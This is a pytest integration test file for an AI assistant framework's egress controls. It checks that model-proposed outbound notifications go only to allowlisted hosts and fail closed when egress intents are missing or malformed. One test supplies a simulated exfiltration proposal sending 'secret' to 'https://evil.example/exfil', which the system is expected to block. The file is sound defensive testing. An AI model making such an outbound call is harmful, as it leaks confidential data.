from __future__ import annotations

import copy
from collections.abc import Callable, Generator
from dataclasses import dataclass, field, replace
from typing import Any, cast

from fastapi.testclient import TestClient
import pytest
from testcontainers.postgres import PostgresContainer

import ariel.action_runtime as action_runtime_module
import ariel.policy_engine as policy_engine_module
from ariel.app import ModelAdapter, create_app
from tests.integration.responses_helpers import responses_with_function_calls
from ariel.capability_registry import (
    CapabilityDefinition,
    get_capability as registry_get_capability,
)


@dataclass
class ActionProposalAdapter:
    provider: str = "provider.s2-pr08"
    model: str = "model.s2-pr08-v1"
    proposals_by_message: dict[str, list[dict[str, Any]]] = field(default_factory=dict)

    def create_response(
        self,
        *,
        input_items: list[dict[str, Any]],
        tools: list[dict[str, Any]],
        user_message: str,
        history: list[dict[str, Any]],
        context_bundle: dict[str, Any],
    ) -> dict[str, Any]:
        del tools, history, context_bundle
        proposals = self.proposals_by_message.get(user_message, [])
        return responses_with_function_calls(
            input_items=input_items,
            assistant_text=f"assistant::{user_message}",
            proposals=copy.deepcopy(proposals),
            provider=self.provider,
            model=self.model,
            provider_response_id="resp_s2_pr08_123",
            input_tokens=21,
            output_tokens=15,
        )


@pytest.fixture(scope="session")
def postgres_url() -> Generator[str, None, None]:
    with PostgresContainer("postgres:16-alpine") as postgres:
        url = postgres.get_connection_url()
        yield url.replace("psycopg2", "psycopg")


def _build_client(postgres_url: str, adapter: ModelAdapter) -> TestClient:
    app = create_app(
        database_url=postgres_url,
        model_adapter=adapter,
        reset_database=True,
    )
    return TestClient(app)


def _session_id(client: TestClient) -> str:
    active = client.get("/v1/sessions/active")
    assert active.status_code == 200
    return active.json()["session"]["id"]


def _surface_attempt(turn_payload: dict[str, Any], *, proposal_index: int = 1) -> dict[str, Any]:
    lifecycle = turn_payload.get("surface_action_lifecycle")
    assert isinstance(lifecycle, list)
    assert len(lifecycle) >= proposal_index
    item = lifecycle[proposal_index - 1]
    assert isinstance(item, dict)
    return item


def _approval_ref(turn_payload: dict[str, Any], *, proposal_index: int = 1) -> str:
    item = _surface_attempt(turn_payload, proposal_index=proposal_index)
    approval = item["approval"]
    assert approval["status"] == "pending"
    approval_ref = approval.get("reference")
    assert isinstance(approval_ref, str)
    return approval_ref


def _event_types(turn_payload: dict[str, Any]) -> list[str]:
    return [event["event_type"] for event in turn_payload["events"]]


def _patch_external_notify_capability_lookup(
    monkeypatch: pytest.MonkeyPatch,
    *,
    mutate: Callable[[CapabilityDefinition], CapabilityDefinition],
) -> None:
    def patched_get_capability(capability_id: str) -> CapabilityDefinition | None:
        capability = registry_get_capability(capability_id)
        if capability_id != "cap.framework.external_notify" or capability is None:
            return capability
        return mutate(capability)

    monkeypatch.setattr(policy_engine_module, "get_capability", patched_get_capability)
    monkeypatch.setattr(action_runtime_module, "get_capability", patched_get_capability)


def test_s2_pr08_allowlisted_path_dispatches_once_and_keeps_surface_contract_clean(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    dispatch_attempts: list[dict[str, Any]] = []

    def fake_dispatch(*, destination: str, payload: dict[str, Any]) -> str | None:
        dispatch_attempts.append({"destination": destination, "payload": payload})
        return None

    monkeypatch.setattr("ariel.executor._dispatch_egress_request", fake_dispatch, raising=False)

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "allowlisted outbound": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "safe payload",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(
            f"/v1/sessions/{session_id}/message",
            json={"message": "allowlisted outbound"},
        )
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve"},
        )
        assert approved.status_code == 200

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        attempt = _surface_attempt(latest_turn)

        assert attempt["execution"]["status"] == "succeeded"
        assert attempt["execution"]["output"]["status"] == "sent"
        assert attempt["execution"]["output"]["destination"] == "https://api.framework.local/notify"
        assert attempt["execution"]["output"]["message"] == "safe payload"
        assert "__egress__" not in str(attempt)

        assert len(dispatch_attempts) == 1
        assert dispatch_attempts[0] == {
            "destination": "https://api.framework.local/notify",
            "payload": {"message": "safe payload"},
        }

        event_types = _event_types(latest_turn)
        assert event_types.count("evt.action.execution.started") == 1
        assert event_types.count("evt.action.execution.succeeded") == 1
        assert "evt.action.execution.failed" not in event_types


def test_s2_pr08_non_allowlisted_preflight_denies_before_capability_execution(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    capability_execute_attempts = 0

    def mutate(capability: CapabilityDefinition) -> CapabilityDefinition:
        original_execute = capability.execute

        def counted_execute(input_payload: dict[str, Any]) -> dict[str, Any]:
            nonlocal capability_execute_attempts
            capability_execute_attempts += 1
            return original_execute(input_payload)

        return replace(capability, execute=counted_execute)

    _patch_external_notify_capability_lookup(monkeypatch, mutate=mutate)

    dispatch_attempts: list[dict[str, Any]] = []

    def fake_dispatch(*, destination: str, payload: dict[str, Any]) -> str | None:
        dispatch_attempts.append({"destination": destination, "payload": payload})
        return None

    monkeypatch.setattr("ariel.executor._dispatch_egress_request", fake_dispatch, raising=False)

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "deny outbound": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://evil.example/exfil",
                        "message": "secret",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "deny outbound"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve"},
        )
        assert approved.status_code == 200
        assert "egress_destination_denied" in approved.json()["assistant"]["message"]

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        attempt = _surface_attempt(latest_turn)

        assert attempt["execution"]["status"] == "failed"
        assert "egress_destination_denied" in (attempt["execution"]["error"] or "")
        assert capability_execute_attempts == 0
        assert dispatch_attempts == []

        event_types = _event_types(latest_turn)
        assert event_types.count("evt.action.execution.started") == 1
        assert event_types.count("evt.action.execution.failed") == 1
        assert "evt.action.execution.succeeded" not in event_types


@pytest.mark.parametrize(
    ("intent_case", "expected_error"),
    [
        ("missing", "egress_preflight_missing_intent"),
        ("malformed", "egress_preflight_contract_invalid"),
        ("malformed_payload", "egress_preflight_contract_invalid"),
        ("undeclared", "egress_preflight_undeclared_intent"),
    ],
)
def test_s2_pr08_missing_malformed_or_undeclared_intent_fails_closed_before_dispatch(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
    intent_case: str,
    expected_error: str,
) -> None:
    capability_execute_attempts = 0

    def mutate(capability: CapabilityDefinition) -> CapabilityDefinition:
        original_execute = capability.execute

        def counted_execute(input_payload: dict[str, Any]) -> dict[str, Any]:
            nonlocal capability_execute_attempts
            capability_execute_attempts += 1
            return original_execute(input_payload)

        if intent_case == "missing":
            return replace(
                capability,
                execute=counted_execute,
                declare_egress_intent=None,
            )
        if intent_case == "malformed":
            return replace(
                capability,
                execute=counted_execute,
                declare_egress_intent=cast(
                    Any,
                    lambda _: {"destination": "https://api.framework.local/notify"},
                ),
            )
        if intent_case == "malformed_payload":
            return replace(
                capability,
                execute=counted_execute,
                declare_egress_intent=cast(
                    Any,
                    lambda _: [
                        {
                            "destination": "https://api.framework.local/notify",
                            "payload": "not-a-dict",
                        }
                    ],
                ),
            )
        return replace(
            capability,
            execute=counted_execute,
            declare_egress_intent=lambda _: [],
        )

    _patch_external_notify_capability_lookup(monkeypatch, mutate=mutate)

    dispatch_attempts: list[dict[str, Any]] = []

    def fake_dispatch(*, destination: str, payload: dict[str, Any]) -> str | None:
        dispatch_attempts.append({"destination": destination, "payload": payload})
        return None

    monkeypatch.setattr("ariel.executor._dispatch_egress_request", fake_dispatch, raising=False)

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "intent failure": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "safe payload",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "intent failure"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve"},
        )
        assert approved.status_code == 200
        assert expected_error in approved.json()["assistant"]["message"]

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        attempt = _surface_attempt(latest_turn)
        assert attempt["execution"]["status"] == "failed"
        assert expected_error in (attempt["execution"]["error"] or "")

        failed_event = next(
            event
            for event in latest_turn["events"]
            if event["event_type"] == "evt.action.execution.failed"
        )
        assert expected_error in failed_event["payload"]["error"]

        assert capability_execute_attempts == 0
        assert dispatch_attempts == []


def test_s2_pr08_preflight_allow_does_not_dispatch_when_execution_fails(
    postgres_url: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def mutate(capability: CapabilityDefinition) -> CapabilityDefinition:
        def failing_execute(_: dict[str, Any]) -> dict[str, Any]:
            raise RuntimeError("forced execute failure after preflight")

        return replace(capability, execute=failing_execute)

    _patch_external_notify_capability_lookup(monkeypatch, mutate=mutate)

    dispatch_attempts: list[dict[str, Any]] = []

    def fake_dispatch(*, destination: str, payload: dict[str, Any]) -> str | None:
        dispatch_attempts.append({"destination": destination, "payload": payload})
        return None

    monkeypatch.setattr("ariel.executor._dispatch_egress_request", fake_dispatch, raising=False)

    adapter = ActionProposalAdapter(
        proposals_by_message={
            "execution fails": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "safe payload",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(
            f"/v1/sessions/{session_id}/message", json={"message": "execution fails"}
        )
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve"},
        )
        assert approved.status_code == 200

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        attempt = _surface_attempt(latest_turn)
        assert attempt["execution"]["status"] == "failed"
        assert isinstance(attempt["execution"]["error"], str)
        assert dispatch_attempts == []
